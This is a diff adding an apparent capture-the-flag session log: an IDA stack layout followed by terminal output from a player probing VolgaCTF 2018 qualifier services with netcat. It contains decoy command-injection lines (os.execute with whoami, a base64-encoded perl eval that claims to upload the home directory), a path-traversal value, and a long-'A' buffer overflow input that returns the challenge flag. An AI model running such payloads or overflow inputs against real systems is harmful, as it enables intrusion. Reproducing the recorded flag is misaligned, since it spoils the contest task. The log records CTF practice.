@@ -1,0 +1,543 @@
+0000000000000128                 db ? ; undefined
+-0000000000000127                 db ? ; undefined
+-0000000000000126                 db ? ; undefined
+-0000000000000125                 db ? ; undefined
+-0000000000000124                 db ? ; undefined
+-0000000000000123                 db ? ; undefined
+-0000000000000122                 db ? ; undefined
+-0000000000000121                 db ? ; undefined
+-0000000000000120                 db ? ; undefined
+-000000000000011F                 db ? ; undefined
+-000000000000011E                 db ? ; undefined
+-000000000000011D                 db ? ; undefined
+-000000000000011C                 db ? ; undefined
+-000000000000011B                 db ? ; undefined
+-000000000000011A                 db ? ; undefined
+-0000000000000119                 db ? ; undefined
+-0000000000000118                 db ? ; undefined
+-0000000000000117                 db ? ; undefined
+-0000000000000116                 db ? ; undefined
+-0000000000000115                 db ? ; undefined
+-0000000000000114                 db ? ; undefined
+-0000000000000113                 db ? ; undefined
+-0000000000000112                 db ? ; undefined
+-0000000000000111                 db ? ; undefined
+-0000000000000110                 db ? ; undefined
+-000000000000010F                 db ? ; undefined
+-000000000000010E                 db ? ; undefined
+-000000000000010D                 db ? ; undefined
+-000000000000010C                 db ? ; undefined
+-000000000000010B                 db ? ; undefined
+-000000000000010A                 db ? ; undefined
+-0000000000000109                 db ? ; undefined
+-0000000000000108                 db ? ; undefined
+-0000000000000107                 db ? ; undefined
+-0000000000000106                 db ? ; undefined
+-0000000000000105                 db ? ; undefined
+-0000000000000104                 db ? ; undefined
+-0000000000000103                 db ? ; undefined
+-0000000000000102                 db ? ; undefined
+-0000000000000101                 db ? ; undefined
+-0000000000000100                 db ? ; undefined
+-00000000000000FF                 db ? ; undefined
+-00000000000000FE                 db ? ; undefined
+-00000000000000FD                 db ? ; undefined
+-00000000000000FC                 db ? ; undefined
+-00000000000000FB                 db ? ; undefined
+-00000000000000FA                 db ? ; undefined
+-00000000000000F9                 db ? ; undefined
+-00000000000000F8                 db ? ; undefined
+-00000000000000F7                 db ? ; undefined
+-00000000000000F6                 db ? ; undefined
+-00000000000000F5                 db ? ; undefined
+-00000000000000F4                 db ? ; undefined
+-00000000000000F3                 db ? ; undefined
+-00000000000000F2                 db ? ; undefined
+-00000000000000F1                 db ? ; undefined
+-00000000000000F0                 db ? ; undefined
+-00000000000000EF                 db ? ; undefined
+-00000000000000EE                 db ? ; undefined
+-00000000000000ED                 db ? ; undefined
+-00000000000000EC                 db ? ; undefined
+-00000000000000EB                 db ? ; undefined
+-00000000000000EA                 db ? ; undefined
+-00000000000000E9                 db ? ; undefined
+-00000000000000E8                 db ? ; undefined
+-00000000000000E7                 db ? ; undefined
+-00000000000000E6                 db ? ; undefined
+-00000000000000E5                 db ? ; undefined
+-00000000000000E4                 db ? ; undefined
+-00000000000000E3                 db ? ; undefined
+-00000000000000E2                 db ? ; undefined
+-00000000000000E1                 db ? ; undefined
+-00000000000000E0                 db ? ; undefined
+-00000000000000DF                 db ? ; undefined
+-00000000000000DE                 db ? ; undefined
+-00000000000000DD                 db ? ; undefined
+-00000000000000DC                 db ? ; undefined
+-00000000000000DB                 db ? ; undefined
+-00000000000000DA                 db ? ; undefined
+-00000000000000D9                 db ? ; undefined
+-00000000000000D8                 db ? ; undefined
+-00000000000000D7                 db ? ; undefined
+-00000000000000D6                 db ? ; undefined
+-00000000000000D5                 db ? ; undefined
+-00000000000000D4                 db ? ; undefined
+-00000000000000D3                 db ? ; undefined
+-00000000000000D2                 db ? ; undefined
+-00000000000000D1                 db ? ; undefined
+-00000000000000D0                 db ? ; undefined
+-00000000000000CF                 db ? ; undefined
+-00000000000000CE                 db ? ; undefined
+-00000000000000CD                 db ? ; undefined
+-00000000000000CC                 db ? ; undefined
+-00000000000000CB                 db ? ; undefined
+-00000000000000CA                 db ? ; undefined
+-00000000000000C9                 db ? ; undefined
+-00000000000000C8                 db ? ; undefined
+-00000000000000C7                 db ? ; undefined
+-00000000000000C6                 db ? ; undefined
+-00000000000000C5                 db ? ; undefined
+-00000000000000C4                 db ? ; undefined
+-00000000000000C3                 db ? ; undefined
+-00000000000000C2                 db ? ; undefined
+-00000000000000C1                 db ? ; undefined
+-00000000000000C0                 db ? ; undefined
+-00000000000000BF                 db ? ; undefined
+-00000000000000BE                 db ? ; undefined
+-00000000000000BD                 db ? ; undefined
+-00000000000000BC                 db ? ; undefined
+-00000000000000BB                 db ? ; undefined
+-00000000000000BA                 db ? ; undefined
+-00000000000000B9                 db ? ; undefined
+-00000000000000B8                 db ? ; undefined
+-00000000000000B7                 db ? ; undefined
+-00000000000000B6                 db ? ; undefined
+-00000000000000B5                 db ? ; undefined
+-00000000000000B4                 db ? ; undefined
+-00000000000000B3                 db ? ; undefined
+-00000000000000B2                 db ? ; undefined
+-00000000000000B1                 db ? ; undefined
+-00000000000000B0                 db ? ; undefined
+-00000000000000AF                 db ? ; undefined
+-00000000000000AE                 db ? ; undefined
+-00000000000000AD                 db ? ; undefined
+-00000000000000AC                 db ? ; undefined
+-00000000000000AB                 db ? ; undefined
+-00000000000000AA                 db ? ; undefined
+-00000000000000A9                 db ? ; undefined
+-00000000000000A8                 db ? ; undefined
+-00000000000000A7                 db ? ; undefined
+-00000000000000A6                 db ? ; undefined
+-00000000000000A5                 db ? ; undefined
+-00000000000000A4                 db ? ; undefined
+-00000000000000A3                 db ? ; undefined
+-00000000000000A2                 db ? ; undefined
+-00000000000000A1                 db ? ; undefined
+-00000000000000A0                 db ? ; undefined
+-000000000000009F                 db ? ; undefined
+-000000000000009E                 db ? ; undefined
+-000000000000009D                 db ? ; undefined
+-000000000000009C                 db ? ; undefined
+-000000000000009B                 db ? ; undefined
+-000000000000009A                 db ? ; undefined
+-0000000000000099                 db ? ; undefined
+-0000000000000098                 db ? ; undefined
+-0000000000000097                 db ? ; undefined
+-0000000000000096                 db ? ; undefined
+-0000000000000095                 db ? ; undefined
+-0000000000000094                 db ? ; undefined
+-0000000000000093                 db ? ; undefined
+-0000000000000092                 db ? ; undefined
+-0000000000000091                 db ? ; undefined
+-0000000000000090                 db ? ; undefined
+-000000000000008F                 db ? ; undefined
+-000000000000008E                 db ? ; undefined
+-000000000000008D                 db ? ; undefined
+-000000000000008C                 db ? ; undefined
+-000000000000008B                 db ? ; undefined
+-000000000000008A                 db ? ; undefined
+-0000000000000089                 db ? ; undefined
+-0000000000000088                 db ? ; undefined
+-0000000000000087                 db ? ; undefined
+-0000000000000086                 db ? ; undefined
+-0000000000000085                 db ? ; undefined
+-0000000000000084                 db ? ; undefined
+-0000000000000083                 db ? ; undefined
+-0000000000000082                 db ? ; undefined
+-0000000000000081                 db ? ; undefined
+-0000000000000080                 db ? ; undefined
+-000000000000007F                 db ? ; undefined
+-000000000000007E                 db ? ; undefined
+-000000000000007D                 db ? ; undefined
+-000000000000007C                 db ? ; undefined
+-000000000000007B                 db ? ; undefined
+-000000000000007A                 db ? ; undefined
+-0000000000000079                 db ? ; undefined
+-0000000000000078                 db ? ; undefined
+-0000000000000077                 db ? ; undefined
+-0000000000000076                 db ? ; undefined
+-0000000000000075                 db ? ; undefined
+-0000000000000074                 db ? ; undefined
+-0000000000000073                 db ? ; undefined
+-0000000000000072                 db ? ; undefined
+-0000000000000071                 db ? ; undefined
+-0000000000000070                 db ? ; undefined
+-000000000000006F                 db ? ; undefined
+-000000000000006E                 db ? ; undefined
+-000000000000006D                 db ? ; undefined
+-000000000000006C                 db ? ; undefined
+-000000000000006B                 db ? ; undefined
+-000000000000006A                 db ? ; undefined
+-0000000000000069                 db ? ; undefined
+-0000000000000068                 db ? ; undefined
+-0000000000000067                 db ? ; undefined
+-0000000000000066                 db ? ; undefined
+-0000000000000065                 db ? ; undefined
+-0000000000000064                 db ? ; undefined
+-0000000000000063                 db ? ; undefined
+-0000000000000062                 db ? ; undefined
+-0000000000000061                 db ? ; undefined
+-0000000000000060                 db ? ; undefined
+-000000000000005F                 db ? ; undefined
+-000000000000005E                 db ? ; undefined
+-000000000000005D                 db ? ; undefined
+-000000000000005C                 db ? ; undefined
+-000000000000005B                 db ? ; undefined
+-000000000000005A                 db ? ; undefined
+-0000000000000059                 db ? ; undefined
+-0000000000000058                 db ? ; undefined
+-0000000000000057                 db ? ; undefined
+-0000000000000056                 db ? ; undefined
+-0000000000000055                 db ? ; undefined
+-0000000000000054                 db ? ; undefined
+-0000000000000053                 db ? ; undefined
+-0000000000000052                 db ? ; undefined
+-0000000000000051                 db ? ; undefined
+-0000000000000050                 db ? ; undefined
+-000000000000004F                 db ? ; undefined
+-000000000000004E                 db ? ; undefined
+-000000000000004D                 db ? ; undefined
+-000000000000004C                 db ? ; undefined
+-000000000000004B                 db ? ; undefined
+-000000000000004A                 db ? ; undefined
+-0000000000000049                 db ? ; undefined
+-0000000000000048                 db ? ; undefined
+-0000000000000047                 db ? ; undefined
+-0000000000000046                 db ? ; undefined
+-0000000000000045                 db ? ; undefined
+-0000000000000044                 db ? ; undefined
+-0000000000000043                 db ? ; undefined
+-0000000000000042                 db ? ; undefined
+-0000000000000041                 db ? ; undefined
+-0000000000000040                 db ? ; undefined
+-000000000000003F                 db ? ; undefined
+-000000000000003E                 db ? ; undefined
+-000000000000003D                 db ? ; undefined
+-000000000000003C                 db ? ; undefined
+-000000000000003B                 db ? ; undefined
+-000000000000003A                 db ? ; undefined
+-0000000000000039                 db ? ; undefined
+-0000000000000038                 db ? ; undefined
+-0000000000000037                 db ? ; undefined
+-0000000000000036                 db ? ; undefined
+-0000000000000035                 db ? ; undefined
+-0000000000000034                 db ? ; undefined
+-0000000000000033                 db ? ; undefined
+-0000000000000032                 db ? ; undefined
+-0000000000000031                 db ? ; undefined
+-0000000000000030                 db ? ; undefined
+-000000000000002F                 db ? ; undefined
+-000000000000002E                 db ? ; undefined
+-000000000000002D                 db ? ; undefined
+-000000000000002C                 db ? ; undefined
+-000000000000002B                 db ? ; undefined
+-000000000000002A                 db ? ; undefined
+-0000000000000029                 db ? ; undefined
+-0000000000000028 var_28          dd ?                    ; v10 위치
+-0000000000000024       
+
+
+`python -c 'print "A"*269'`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Xshell 5 (Build 1339)
+Copyright (c) 2002-2017 NetSarang Computer, Inc. All rights reserved.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ ssh unifox.kr
+
+
+Host 'unifox.kr' resolved to 45.32.61.208.
+Connecting to 45.32.61.208:22...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+Connection closing...Socket close.
+
+Connection closed by foreign host.
+
+Disconnected from remote host(unifox.kr:22) at 13:00:15.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ ssh unifox.kr
+
+
+Host 'unifox.kr' resolved to 45.32.61.208.
+Connecting to 45.32.61.208:22...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ǐŰ¶ 206°³¸¦  ¾妀͆®Ȓ ¼ၖ½4ϴ׮
+121 ¾妀͆®´ º¸¾Ơ¾妀͆®T´ϴ׮
+
+
+Last login: Sun Mar 18 14:00:37 2018 from 1.230.112.65
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [destination] [port]
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [destination] [port]
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 100
+HTTP/1.0 200 OK
+p<title>:: ThinStation ::</title>n<h2>Thinstation PGZU_v on EUPYKn_Hk :: Main page</h2>
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 1000
+ICY 396 kSHOUTcast Distributed Network Audio Server/Linuxhv157605
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 80
+HTTP/1.0 200 OK
+Server: Apache/IBM_Lotus_Domino_v.6.5.0
+
+--<html>
+--<body><a href="user-UserID">
+--<input name="HTTPPassword"  value="PPASSS">
+--<input name="FullName" value="../../../../usr/local/share/nmap/scripts/http-domino-enum-passwords.nsea\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\%d
+--">
+
+--<a href="%?OpenDocumentddddd">
+--<form action="aaa?ReadForm&">
+--</body>
+--</html>
+os.execute("echo 'You have been PWNed';whoami; uname -a");
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 80
+HTTP/1.0 200 OK
+Server: Apache/IBM_Lotus_Domino_v.6.5.0
+
+--<html>
+--<body><a href="user-UserID">
+--<input name="HTTPPassword"  value="PPASSS">
+--<input name="FullName" value="../../../../usr/local/share/nmap/scripts/http-domino-enum-passwords.nsea\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\%d
+--">
+
+--<a href="%?OpenDocumentddddd">
+--<form action="aaa?ReadForm&">
+--</body>
+--</html>
+os.execute("echo 'You have been PWNed';whoami; uname -a");
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 800
+220  Server (ProFTPD) [xDrE]
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 00
+nc: port number too small: 00
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 100
+^[[AHTTP/1.0 200 OK
+p<title>:: ThinStation ::</title>n<h2>Thinstation PGZU_v on EUPYKn_Hk :: Main page</h2>
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 1
+550 12345 0000000000000000000000000000000000000000000000000000000circler@unifox:~$ nc ping.quals.2018.volgactf.ru 10
+550 12345 0fffffffff70000088800888800088888800008800007ffffffff00circler@unifox:~$ nc ping.quals.2018.volgactf.ru 50
+550 12345 0000000000000000000000000000000000000000000000000000000circler@unifox:~$ nc ping.quals.2018.volgactf.ru 99
+HTTP/1.1 585 y
+Connection: Close
+X-ORCL-EMSV: 55011196
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 100
+HTTP/1.0 200 OK
+p<title>:: ThinStation ::</title>n<h2>Thinstation PGZU_v on EUPYKn_Hk :: Main page</h2>
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 200
+^[[AHTTP/1.1 791 e
+Server: HFS ­Ƽ?
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 300
+?SH-86-SSH Compatible Server
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 400
+220 PostCast SMTP servers
+
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 500
+0&000f602665:3000000ª000j39:400000
+                                  micro_pause0 L¤000´00000000000L¤000´000
+rest_break0
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 100
+HTTP/1.0 200 OK
+p<title>:: ThinStation ::</title>n<h2>Thinstation PGZU_v on EUPYKn_Hk :: Main page</h2>
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 8080
+/bin/bash	-c	{perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==}	$_=$ARGV[0];~s/SPACE/\t/ig;eval;$_=$ARGV[1];eval(decode_base64($_));circler@unifox:~$ print "PWNED\n" x 5 ; $_=`pwd`; print "\nuploading your home directory: ",$_,"... \n\n";
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file "PWNED\n"
+Error: no such file "x"
+Error: no such file "5"
+-bash: 5=/home/circler: 그런 파일이나 디렉터리가 없습니다
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file ":\nuploading your home directory: ,5=/home/circler,... \n\n"
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ print "PWNED\n" x 5 ; $_=`pwd`; print "\nuploading your home directory: ",$_,"... \n\n";
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file "PWNED\n"
+Error: no such file "x"
+Error: no such file "5"
+-bash: 5=/home/circler: 그런 파일이나 디렉터리가 없습니다
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file ":\nuploading your home directory: ,5=/home/circler,... \n\n"
+circler@unifox:~$ nc ping.quals.2018.volgactf.ru 80
+HTTP/1.0 200 OK
+Server: Apache/IBM_Lotus_Domino_v.6.5.0
+
+--<html>
+--<body><a href="user-UserID">
+--<input name="HTTPPassword"  value="PPASSS">
+--<input name="FullName" value="../../../../usr/local/share/nmap/scripts/http-domino-enum-passwords.nsea\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\%d
+--">
+
+--<a href="%?OpenDocumentddddd">
+--<form action="aaa?ReadForm&">
+--</body>
+--</html>
+os.execute("echo 'You have been PWNed';whoami; uname -a");
+
+circler@unifox:~$ print "PWNED\n" x 5 ; $_=`pwd`; print "\nuploading your home directory: ",$_,"... \n\n";
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file "PWNED\n"
+Error: no such file "x"
+Error: no such file "5"
+-bash: 5=/home/circler: 그런 파일이나 디렉터리가 없습니다
+Unescaped left brace in regex is deprecated, passed through in regex; marked by <-- HERE in m/%{ <-- HERE (.*?)}/ at /usr/bin/print line 528.
+Error: no such file ":\nuploading your home directory: ,5=/home/circler,... \n\n"
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ 
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru:45678
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [destination] [port]
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: 12
+Wrong password!
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: ddddddddddddddddddddddddddddd
+Wrong password!
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: volga
+Wrong password!
+circler@unifox:~$ 
+Socket error Event: 32 Error: 10053.
+Connection closing...Socket close.
+
+Connection closed by foreign host.
+
+Disconnected from remote host(unifox.kr:22) at 15:15:29.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ ping2.quals.2018.volgactf.ru 45678
+'ping2.quals.2018.volgactf.ru'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
+배치 파일이 아닙니다.
+
+[c:\~]$ ssh unifox.kr
+
+
+Host 'unifox.kr' resolved to 45.32.61.208.
+Connecting to 45.32.61.208:22...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ǐŰ¶ 209°³¸¦  ¾妀͆®Ȓ ¼ၖ½4ϴ׮
+121 ¾妀͆®´ º¸¾Ơ¾妀͆®T´ϴ׮
+
+
+Last login: Sat Mar 24 04:00:21 2018 from 220.116.191.142
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: `python -c 'print "A"*269'`
+Wrong password!
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: 
+Wrong password!
+circler@unifox:~$ `python -c 'print "A"*269'`
+  File "<string>", line 1
+    print "A"*269
+            ^
+SyntaxError: Missing parentheses in call to 'print'
+circler@unifox:~$ `python -c 'print "A"*260'`
+  File "<string>", line 1
+    print "A"*260
+            ^
+SyntaxError: Missing parentheses in call to 'print'
+circler@unifox:~$ `python -c 'print "A"'`
+  File "<string>", line 1
+    print "A"
+            ^
+SyntaxError: Missing parentheses in call to 'print'
+circler@unifox:~$ python
+Python 3.6.1 (default, Jun 29 2017, 03:29:05) 
+[GCC 5.4.0 20160609] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print("A")
+A
+>>> print("A"*260)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>>> exit
+Use exit() or Ctrl-D (i.e. EOF) to exit
+>>> exit()
+circler@unifox:~$ nc ping2.quals.2018.volgactf.ru 45678
+Enter your password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Correct password! Your flag is VolgaCTF{Except1on@l!Wond3rful!Splend1d.Well_d0ne!}
+circler@unifox:~$ exit
+로그아웃
+Connection closing...Socket close.
+
+Connection closed by foreign host.
+
+Disconnected from remote host(unifox.kr:22) at 21:42:32.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
